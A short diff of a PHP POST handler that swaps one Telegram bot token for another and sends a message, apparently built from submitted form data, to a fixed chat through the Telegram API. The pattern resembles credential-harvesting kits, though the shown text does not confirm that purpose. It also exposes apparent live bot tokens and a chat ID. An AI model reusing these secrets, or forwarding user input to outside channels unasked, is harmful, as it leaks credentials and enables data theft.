@@ -25,7 +25,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     ; 
 
     // Sending to a Telegram bot hypothetically
-     $telegramBotToken = '6367338929:AAHMMbQSLxEpLOkX1027eYvgaumrd9-NRCk';
+     $telegramBotToken = '6676319522:AAHx7QharxfLNSQ6HLQaPudpRyZMvgIGEzw';
      $chatId = '1064643518';
      $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
     
